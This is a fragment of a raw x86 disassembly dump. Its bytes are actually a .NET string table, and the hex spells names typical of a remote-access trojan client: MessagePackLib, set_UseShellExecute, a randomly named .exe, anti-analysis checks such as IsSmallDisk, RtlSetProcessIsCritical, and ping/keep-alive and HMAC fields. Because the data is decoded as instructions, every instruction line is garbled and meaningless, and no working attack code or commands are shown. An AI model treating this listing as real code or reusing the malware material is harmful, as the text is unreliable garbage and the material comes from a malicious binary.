  40813f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408143:	74 74                	je     0x4081b9
  408145:	72 69                	jb     0x4081b0
  408147:	62 75 74             	bound  %esi,0x74(%ebp)
  40814a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40814e:	6d                   	insl   (%dx),%es:(%edi)
  40814f:	56                   	push   %esi
  408150:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408157:	74 74                	je     0x4081cd
  408159:	72 69                	jb     0x4081c4
  40815b:	62 75 74             	bound  %esi,0x74(%ebp)
  40815e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408162:	73 65                	jae    0x4081c9
  408164:	6d                   	insl   (%dx),%es:(%edi)
  408165:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408169:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408170:	72 
  408171:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408178:	73 73                	jae    0x4081ed
  40817a:	65 6d                	gs insl (%dx),%es:(%edi)
  40817c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408180:	72 61                	jb     0x4081e3
  408182:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408185:	61                   	popa
  408186:	72 6b                	jb     0x4081f3
  408188:	41                   	inc    %ecx
  408189:	74 74                	je     0x4081ff
  40818b:	72 69                	jb     0x4081f6
  40818d:	62 75 74             	bound  %esi,0x74(%ebp)
  408190:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408195:	67 65 74 46          	addr16 gs je 0x4081df
  408199:	72 61                	jb     0x4081fc
  40819b:	6d                   	insl   (%dx),%es:(%edi)
  40819c:	65 77 6f             	gs ja  0x40820e
  40819f:	72 6b                	jb     0x40820c
  4081a1:	41                   	inc    %ecx
  4081a2:	74 74                	je     0x408218
  4081a4:	72 69                	jb     0x40820f
  4081a6:	62 75 74             	bound  %esi,0x74(%ebp)
  4081a9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081ad:	73 65                	jae    0x408214
  4081af:	6d                   	insl   (%dx),%es:(%edi)
  4081b0:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081b4:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081bb:	69 
  4081bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081be:	41                   	inc    %ecx
  4081bf:	74 74                	je     0x408235
  4081c1:	72 69                	jb     0x40822c
  4081c3:	62 75 74             	bound  %esi,0x74(%ebp)
  4081c6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081ca:	73 65                	jae    0x408231
  4081cc:	6d                   	insl   (%dx),%es:(%edi)
  4081cd:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d3:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081d9:	74 69                	je     0x408244
  4081db:	6f                   	outsl  %ds:(%esi),(%dx)
  4081dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4081dd:	41                   	inc    %ecx
  4081de:	74 74                	je     0x408254
  4081e0:	72 69                	jb     0x40824b
  4081e2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081e5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081e9:	73 65                	jae    0x408250
  4081eb:	6d                   	insl   (%dx),%es:(%edi)
  4081ec:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081f0:	65 73 63             	gs jae 0x408256
  4081f3:	72 69                	jb     0x40825e
  4081f5:	70 74                	jo     0x40826b
  4081f7:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081fe:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408205:	65 66 61             	gs popaw
  408208:	75 6c                	jne    0x408276
  40820a:	74 4d                	je     0x408259
  40820c:	65 6d                	gs insl (%dx),%es:(%edi)
  40820e:	62 65 72             	bound  %esp,0x72(%ebp)
  408211:	41                   	inc    %ecx
  408212:	74 74                	je     0x408288
  408214:	72 69                	jb     0x40827f
  408216:	62 75 74             	bound  %esi,0x74(%ebp)
  408219:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40821d:	6d                   	insl   (%dx),%es:(%edi)
  40821e:	70 69                	jo     0x408289
  408220:	6c                   	insb   (%dx),%es:(%edi)
  408221:	61                   	popa
  408222:	74 69                	je     0x40828d
  408224:	6f                   	outsl  %ds:(%esi),(%dx)
  408225:	6e                   	outsb  %ds:(%esi),(%dx)
  408226:	52                   	push   %edx
  408227:	65 6c                	gs insb (%dx),%es:(%edi)
  408229:	61                   	popa
  40822a:	78 61                	js     0x40828d
  40822c:	74 69                	je     0x408297
  40822e:	6f                   	outsl  %ds:(%esi),(%dx)
  40822f:	6e                   	outsb  %ds:(%esi),(%dx)
  408230:	73 41                	jae    0x408273
  408232:	74 74                	je     0x4082a8
  408234:	72 69                	jb     0x40829f
  408236:	62 75 74             	bound  %esi,0x74(%ebp)
  408239:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40823d:	73 65                	jae    0x4082a4
  40823f:	6d                   	insl   (%dx),%es:(%edi)
  408240:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408244:	72 6f                	jb     0x4082b5
  408246:	64 75 63             	fs jne 0x4082ac
  408249:	74 41                	je     0x40828c
  40824b:	74 74                	je     0x4082c1
  40824d:	72 69                	jb     0x4082b8
  40824f:	62 75 74             	bound  %esi,0x74(%ebp)
  408252:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408256:	73 65                	jae    0x4082bd
  408258:	6d                   	insl   (%dx),%es:(%edi)
  408259:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40825d:	6f                   	outsl  %ds:(%esi),(%dx)
  40825e:	70 79                	jo     0x4082d9
  408260:	72 69                	jb     0x4082cb
  408262:	67 68 74 41 74 74    	addr16 push $0x74744174
  408268:	72 69                	jb     0x4082d3
  40826a:	62 75 74             	bound  %esi,0x74(%ebp)
  40826d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408271:	73 65                	jae    0x4082d8
  408273:	6d                   	insl   (%dx),%es:(%edi)
  408274:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408278:	6f                   	outsl  %ds:(%esi),(%dx)
  408279:	6d                   	insl   (%dx),%es:(%edi)
  40827a:	70 61                	jo     0x4082dd
  40827c:	6e                   	outsb  %ds:(%esi),(%dx)
  40827d:	79 41                	jns    0x4082c0
  40827f:	74 74                	je     0x4082f5
  408281:	72 69                	jb     0x4082ec
  408283:	62 75 74             	bound  %esi,0x74(%ebp)
  408286:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40828a:	6e                   	outsb  %ds:(%esi),(%dx)
  40828b:	74 69                	je     0x4082f6
  40828d:	6d                   	insl   (%dx),%es:(%edi)
  40828e:	65 43                	gs inc %ebx
  408290:	6f                   	outsl  %ds:(%esi),(%dx)
  408291:	6d                   	insl   (%dx),%es:(%edi)
  408292:	70 61                	jo     0x4082f5
  408294:	74 69                	je     0x4082ff
  408296:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408299:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4082a0:	69 
  4082a1:	62 75 74             	bound  %esi,0x74(%ebp)
  4082a4:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4082a8:	74 5f                	je     0x408309
  4082aa:	55                   	push   %ebp
  4082ab:	73 65                	jae    0x408312
  4082ad:	53                   	push   %ebx
  4082ae:	68 65 6c 6c 45       	push   $0x456c6c65
  4082b3:	78 65                	js     0x40831a
  4082b5:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082b8:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082bc:	61                   	popa
  4082bd:	64 42                	fs inc %edx
  4082bf:	79 74                	jns    0x408335
  4082c1:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082c5:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082cc:	00 
  4082cd:	44                   	inc    %esp
  4082ce:	65 6c                	gs insb (%dx),%es:(%edi)
  4082d0:	65 74 65             	gs je  0x408338
  4082d3:	56                   	push   %esi
  4082d4:	61                   	popa
  4082d5:	6c                   	insb   (%dx),%es:(%edi)
  4082d6:	75 65                	jne    0x40833d
  4082d8:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082db:	6e                   	outsb  %ds:(%esi),(%dx)
  4082dc:	65 72 56             	gs jb  0x408335
  4082df:	61                   	popa
  4082e0:	6c                   	insb   (%dx),%es:(%edi)
  4082e1:	75 65                	jne    0x408348
  4082e3:	00 47 65             	add    %al,0x65(%edi)
  4082e6:	74 56                	je     0x40833e
  4082e8:	61                   	popa
  4082e9:	6c                   	insb   (%dx),%es:(%edi)
  4082ea:	75 65                	jne    0x408351
  4082ec:	00 53 65             	add    %dl,0x65(%ebx)
  4082ef:	74 56                	je     0x408347
  4082f1:	61                   	popa
  4082f2:	6c                   	insb   (%dx),%es:(%edi)
  4082f3:	75 65                	jne    0x40835a
  4082f5:	00 76 61             	add    %dh,0x61(%esi)
  4082f8:	6c                   	insb   (%dx),%es:(%edi)
  4082f9:	75 65                	jne    0x408360
  4082fb:	00 67 65             	add    %ah,0x65(%edi)
  4082fe:	74 5f                	je     0x40835f
  408300:	4b                   	dec    %ebx
  408301:	65 65 70 41          	gs gs jo 0x408346
  408305:	6c                   	insb   (%dx),%es:(%edi)
  408306:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  40830d:	5f                   	pop    %edi
  40830e:	4b                   	dec    %ebx
  40830f:	65 65 70 41          	gs gs jo 0x408354
  408313:	6c                   	insb   (%dx),%es:(%edi)
  408314:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40831b:	6f                   	outsl  %ds:(%esi),(%dx)
  40831c:	76 65                	jbe    0x408383
  40831e:	00 30                	add    %dh,(%eax)
  408320:	68 6e 62 6e 36       	push   $0x366e626e
  408325:	35 45 4c 35 41       	xor    $0x41354c45,%eax
  40832a:	43                   	inc    %ebx
  40832b:	65 35 6e 59 2e 65    	gs xor $0x652e596e,%eax
  408331:	78 65                	js     0x408398
  408333:	00 73 65             	add    %dh,0x65(%ebx)
  408336:	74 5f                	je     0x408397
  408338:	42                   	inc    %edx
  408339:	6c                   	insb   (%dx),%es:(%edi)
  40833a:	6f                   	outsl  %ds:(%esi),(%dx)
  40833b:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40833e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408345:	5f                   	pop    %edi
  408346:	54                   	push   %esp
  408347:	6f                   	outsl  %ds:(%esi),(%dx)
  408348:	74 61                	je     0x4083ab
  40834a:	6c                   	insb   (%dx),%es:(%edi)
  40834b:	53                   	push   %ebx
  40834c:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408353:	5f                   	pop    %edi
  408354:	48                   	dec    %eax
  408355:	65 61                	gs popa
  408357:	64 65 72 53          	fs gs jb 0x4083ae
  40835b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408362:	5f                   	pop    %edi
  408363:	48                   	dec    %eax
  408364:	65 61                	gs popa
  408366:	64 65 72 53          	fs gs jb 0x4083bd
  40836a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408371:	5f                   	pop    %edi
  408372:	53                   	push   %ebx
  408373:	65 6e                	outsb  %gs:(%esi),(%dx)
  408375:	64 42                	fs inc %edx
  408377:	75 66                	jne    0x4083df
  408379:	66 65 72 53          	data16 gs jb 0x4083d0
  40837d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408384:	5f                   	pop    %edi
  408385:	52                   	push   %edx
  408386:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40838a:	76 65                	jbe    0x4083f1
  40838c:	42                   	inc    %edx
  40838d:	75 66                	jne    0x4083f5
  40838f:	66 65 72 53          	data16 gs jb 0x4083e6
  408393:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40839a:	5f                   	pop    %edi
  40839b:	4b                   	dec    %ebx
  40839c:	65 79 53             	gs jns 0x4083f2
  40839f:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  4083a6:	65 78 4f             	gs js  0x4083f8
  4083a9:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  4083ad:	72 46                	jb     0x4083f5
  4083af:	6c                   	insb   (%dx),%es:(%edi)
  4083b0:	61                   	popa
  4083b1:	67 00 43 72          	add    %al,0x72(%bp,%di)
  4083b5:	79 70                	jns    0x408427
  4083b7:	74 6f                	je     0x408428
  4083b9:	43                   	inc    %ebx
  4083ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4083bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083bc:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083c2:	74 5f                	je     0x408423
  4083c4:	50                   	push   %eax
  4083c5:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083cc:	5f                   	pop    %edi
  4083cd:	50                   	push   %eax
  4083ce:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083d5:	74 65                	je     0x40843c
  4083d7:	6d                   	insl   (%dx),%es:(%edi)
  4083d8:	2e 54                	cs push %esp
  4083da:	68 72 65 61 64       	push   $0x64616572
  4083df:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083e6:	5f                   	pop    %edi
  4083e7:	50                   	push   %eax
  4083e8:	61                   	popa
  4083e9:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083f0:	64 64 
  4083f2:	5f                   	pop    %edi
  4083f3:	53                   	push   %ebx
  4083f4:	65 73 73             	gs jae 0x40846a
  4083f7:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ff:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408403:	73 74                	jae    0x408479
  408405:	65 6d                	gs insl (%dx),%es:(%edi)
  408407:	45                   	inc    %ebp
  408408:	76 65                	jbe    0x40846f
  40840a:	6e                   	outsb  %ds:(%esi),(%dx)
  40840b:	74 73                	je     0x408480
  40840d:	5f                   	pop    %edi
  40840e:	53                   	push   %ebx
  40840f:	65 73 73             	gs jae 0x408485
  408412:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408419:	6e                   	outsb  %ds:(%esi),(%dx)
  40841a:	67 00 55 54          	add    %dl,0x54(%di)
  40841e:	46                   	inc    %esi
  40841f:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408422:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408425:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40842c:	74 65                	je     0x408493
  40842e:	6d                   	insl   (%dx),%es:(%edi)
  40842f:	2e 44                	cs inc %esp
  408431:	72 61                	jb     0x408494
  408433:	77 69                	ja     0x40849e
  408435:	6e                   	outsb  %ds:(%esi),(%dx)
  408436:	67 2e 49             	addr16 cs dec %ecx
  408439:	6d                   	insl   (%dx),%es:(%edi)
  40843a:	61                   	popa
  40843b:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408442:	73 
  408443:	74 65                	je     0x4084aa
  408445:	6d                   	insl   (%dx),%es:(%edi)
  408446:	2e 52                	cs push %edx
  408448:	75 6e                	jne    0x4084b8
  40844a:	74 69                	je     0x4084b5
  40844c:	6d                   	insl   (%dx),%es:(%edi)
  40844d:	65 2e 56             	gs cs push %esi
  408450:	65 72 73             	gs jb  0x4084c6
  408453:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40845a:	46                   	inc    %esi
  40845b:	72 6f                	jb     0x4084cc
  40845d:	6d                   	insl   (%dx),%es:(%edi)
  40845e:	42                   	inc    %edx
  40845f:	61                   	popa
  408460:	73 65                	jae    0x4084c7
  408462:	36 34 53             	ss xor $0x53,%al
  408465:	74 72                	je     0x4084d9
  408467:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40846e:	61                   	popa
  40846f:	73 65                	jae    0x4084d6
  408471:	36 34 53             	ss xor $0x53,%al
  408474:	74 72                	je     0x4084e8
  408476:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40847d:	64 53                	fs push %ebx
  40847f:	74 72                	je     0x4084f3
  408481:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408488:	6e                   	outsb  %ds:(%esi),(%dx)
  408489:	6c                   	insb   (%dx),%es:(%edi)
  40848a:	6f                   	outsl  %ds:(%esi),(%dx)
  40848b:	61                   	popa
  40848c:	64 53                	fs push %ebx
  40848e:	74 72                	je     0x408502
  408490:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408497:	74 65                	je     0x4084fe
  408499:	53                   	push   %ebx
  40849a:	74 72                	je     0x40850e
  40849c:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4084a3:	74 72                	je     0x408517
  4084a5:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4084ac:	5f                   	pop    %edi
  4084ad:	41                   	inc    %ecx
  4084ae:	73 53                	jae    0x408503
  4084b0:	74 72                	je     0x408524
  4084b2:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084b9:	5f                   	pop    %edi
  4084ba:	41                   	inc    %ecx
  4084bb:	73 53                	jae    0x408510
  4084bd:	74 72                	je     0x408531
  4084bf:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084c6:	65 73 41             	gs jae 0x40850a
  4084c9:	73 53                	jae    0x40851e
  4084cb:	74 72                	je     0x40853f
  4084cd:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d4:	41                   	inc    %ecx
  4084d5:	73 53                	jae    0x40852a
  4084d7:	74 72                	je     0x40854b
  4084d9:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084e0:	41                   	inc    %ecx
  4084e1:	73 53                	jae    0x408536
  4084e3:	74 72                	je     0x408557
  4084e5:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084ec:	53                   	push   %ebx
  4084ed:	74 72                	je     0x408561
  4084ef:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084f6:	65 73 41             	gs jae 0x40853a
  4084f9:	73 48                	jae    0x408543
  4084fb:	65 78 53             	gs js  0x408551
  4084fe:	74 72                	je     0x408572
  408500:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408507:	73 74                	jae    0x40857d
  408509:	72 69                	jb     0x408574
  40850b:	6e                   	outsb  %ds:(%esi),(%dx)
  40850c:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408510:	73 74                	jae    0x408586
  408512:	65 6d                	gs insl (%dx),%es:(%edi)
  408514:	2e 44                	cs inc %esp
  408516:	72 61                	jb     0x408579
  408518:	77 69                	ja     0x408583
  40851a:	6e                   	outsb  %ds:(%esi),(%dx)
  40851b:	67 00 67 65          	add    %ah,0x65(%bx)
  40851f:	74 5f                	je     0x408580
  408521:	41                   	inc    %ecx
  408522:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408526:	61                   	popa
  408527:	74 65                	je     0x40858e
  408529:	50                   	push   %eax
  40852a:	6f                   	outsl  %ds:(%esi),(%dx)
  40852b:	6e                   	outsb  %ds:(%esi),(%dx)
  40852c:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408530:	74 5f                	je     0x408591
  408532:	41                   	inc    %ecx
  408533:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408537:	61                   	popa
  408538:	74 65                	je     0x40859f
  40853a:	50                   	push   %eax
  40853b:	6f                   	outsl  %ds:(%esi),(%dx)
  40853c:	6e                   	outsb  %ds:(%esi),(%dx)
  40853d:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408541:	74 5f                	je     0x4085a2
  408543:	45                   	inc    %ebp
  408544:	72 72                	jb     0x4085b8
  408546:	6f                   	outsl  %ds:(%esi),(%dx)
  408547:	72 44                	jb     0x40858d
  408549:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408550:	73 67                	jae    0x4085b9
  408552:	00 43 6f             	add    %al,0x6f(%ebx)
  408555:	6d                   	insl   (%dx),%es:(%edi)
  408556:	70 75                	jo     0x4085cd
  408558:	74 65                	je     0x4085bf
  40855a:	48                   	dec    %eax
  40855b:	61                   	popa
  40855c:	73 68                	jae    0x4085c6
  40855e:	00 73 74             	add    %dh,0x74(%ebx)
  408561:	72 54                	jb     0x4085b7
  408563:	6f                   	outsl  %ds:(%esi),(%dx)
  408564:	48                   	dec    %eax
  408565:	61                   	popa
  408566:	73 68                	jae    0x4085d0
  408568:	00 47 65             	add    %al,0x65(%edi)
  40856b:	74 48                	je     0x4085b5
  40856d:	61                   	popa
  40856e:	73 68                	jae    0x4085d8
  408570:	00 56 65             	add    %dl,0x65(%esi)
  408573:	72 69                	jb     0x4085de
  408575:	66 79 48             	data16 jns 0x4085c0
  408578:	61                   	popa
  408579:	73 68                	jae    0x4085e3
  40857b:	00 46 6c             	add    %al,0x6c(%esi)
  40857e:	75 73                	jne    0x4085f3
  408580:	68 00 67 65 74       	push   $0x74656700
  408585:	5f                   	pop    %edi
  408586:	45                   	inc    %ebp
  408587:	78 65                	js     0x4085ee
  408589:	63 75 74             	arpl   %esi,0x74(%ebp)
  40858c:	61                   	popa
  40858d:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408591:	61                   	popa
  408592:	74 68                	je     0x4085fc
  408594:	00 47 65             	add    %al,0x65(%edi)
  408597:	74 54                	je     0x4085ed
  408599:	65 6d                	gs insl (%dx),%es:(%edi)
  40859b:	70 50                	jo     0x4085ed
  40859d:	61                   	popa
  40859e:	74 68                	je     0x408608
  4085a0:	00 70 61             	add    %dh,0x61(%eax)
  4085a3:	74 68                	je     0x40860d
  4085a5:	00 48 6d             	add    %cl,0x6d(%eax)
  4085a8:	61                   	popa
  4085a9:	63 53 68             	arpl   %edx,0x68(%ebx)
  4085ac:	61                   	popa
  4085ad:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  4085b3:	67 74 68             	addr16 je 0x40861e
  4085b6:	00 67 65             	add    %ah,0x65(%edi)
  4085b9:	74 5f                	je     0x40861a
  4085bb:	4c                   	dec    %esp
  4085bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085be:	67 74 68             	addr16 je 0x408629
  4085c1:	00 49 76             	add    %cl,0x76(%ecx)
  4085c4:	4c                   	dec    %esp
  4085c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085c7:	67 74 68             	addr16 je 0x408632
  4085ca:	00 41 75             	add    %al,0x75(%ecx)
  4085cd:	74 68                	je     0x408637
  4085cf:	4b                   	dec    %ebx
  4085d0:	65 79 4c             	gs jns 0x40861f
  4085d3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085d5:	67 74 68             	addr16 je 0x408640
  4085d8:	00 55 72             	add    %dl,0x72(%ebp)
  4085db:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085e1:	00 6d 73             	add    %ch,0x73(%ebp)
  4085e4:	67 70 61             	addr16 jo 0x408648
  4085e7:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085ea:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085ed:	6c                   	insb   (%dx),%es:(%edi)
  4085ee:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f6:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085f9:	4d                   	dec    %ebp
  4085fa:	65 73 73             	gs jae 0x408670
  4085fd:	61                   	popa
  4085fe:	67 65 50             	addr16 gs push %eax
  408601:	61                   	popa
  408602:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  408605:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  40860c:	61                   	popa
  40860d:	67 65 50             	addr16 gs push %eax
  408610:	61                   	popa
  408611:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408614:	4d                   	dec    %ebp
  408615:	73 67                	jae    0x40867e
  408617:	50                   	push   %eax
  408618:	61                   	popa
  408619:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40861c:	41                   	inc    %ecx
  40861d:	73 79                	jae    0x408698
  40861f:	6e                   	outsb  %ds:(%esi),(%dx)
  408620:	63 43 61             	arpl   %eax,0x61(%ebx)
  408623:	6c                   	insb   (%dx),%es:(%edi)
  408624:	6c                   	insb   (%dx),%es:(%edi)
  408625:	62 61 63             	bound  %esp,0x63(%ecx)
  408628:	6b 00 52             	imul   $0x52,(%eax),%eax
  40862b:	65 6d                	gs insl (%dx),%es:(%edi)
  40862d:	6f                   	outsl  %ds:(%esi),(%dx)
  40862e:	74 65                	je     0x408695
  408630:	43                   	inc    %ebx
  408631:	65 72 74             	gs jb  0x4086a8
  408634:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40863b:	56                   	push   %esi
  40863c:	61                   	popa
  40863d:	6c                   	insb   (%dx),%es:(%edi)
  40863e:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408645:	43 
  408646:	61                   	popa
  408647:	6c                   	insb   (%dx),%es:(%edi)
  408648:	6c                   	insb   (%dx),%es:(%edi)
  408649:	62 61 63             	bound  %esp,0x63(%ecx)
  40864c:	6b 00 54             	imul   $0x54,(%eax),%eax
  40864f:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408656:	6c                   	insb   (%dx),%es:(%edi)
  408657:	62 61 63             	bound  %esp,0x63(%ecx)
  40865a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40865d:	6e                   	outsb  %ds:(%esi),(%dx)
  40865e:	70 61                	jo     0x4086c1
  408660:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408663:	6d                   	insl   (%dx),%es:(%edi)
  408664:	73 67                	jae    0x4086cd
  408666:	70 61                	jo     0x4086c9
  408668:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40866b:	52                   	push   %edx
  40866c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408673:	4b 65 
  408675:	79 50                	jns    0x4086c7
  408677:	65 72 6d             	gs jb  0x4086e7
  40867a:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408681:	68 65 63 6b 00       	push   $0x6b6365
  408686:	46                   	inc    %esi
  408687:	6c                   	insb   (%dx),%es:(%edi)
  408688:	75 73                	jne    0x4086fd
  40868a:	68 46 69 6e 61       	push   $0x616e6946
  40868f:	6c                   	insb   (%dx),%es:(%edi)
  408690:	42                   	inc    %edx
  408691:	6c                   	insb   (%dx),%es:(%edi)
  408692:	6f                   	outsl  %ds:(%esi),(%dx)
  408693:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408696:	49                   	dec    %ecx
  408697:	73 53                	jae    0x4086ec
  408699:	6d                   	insl   (%dx),%es:(%edi)
  40869a:	61                   	popa
  40869b:	6c                   	insb   (%dx),%es:(%edi)
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	44                   	inc    %esp
  40869e:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  4086a5:	6c                   	insb   (%dx),%es:(%edi)
  4086a6:	00 66 56             	add    %ah,0x56(%esi)
  4086a9:	61                   	popa
  4086aa:	6c                   	insb   (%dx),%es:(%edi)
  4086ab:	00 69 56             	add    %ch,0x56(%ecx)
  4086ae:	61                   	popa
  4086af:	6c                   	insb   (%dx),%es:(%edi)
  4086b0:	00 73 74             	add    %dh,0x74(%ebx)
  4086b3:	72 56                	jb     0x40870b
  4086b5:	61                   	popa
  4086b6:	6c                   	insb   (%dx),%es:(%edi)
  4086b7:	00 52 74             	add    %dl,0x74(%edx)
  4086ba:	6c                   	insb   (%dx),%es:(%edi)
  4086bb:	53                   	push   %ebx
  4086bc:	65 74 50             	gs je  0x40870f
  4086bf:	72 6f                	jb     0x408730
  4086c1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086c4:	73 49                	jae    0x40870f
  4086c6:	73 43                	jae    0x40870b
  4086c8:	72 69                	jb     0x408733
  4086ca:	74 69                	je     0x408735
  4086cc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086cf:	00 50 72             	add    %dl,0x72(%eax)
  4086d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086d6:	73 43                	jae    0x40871b
  4086d8:	72 69                	jb     0x408743
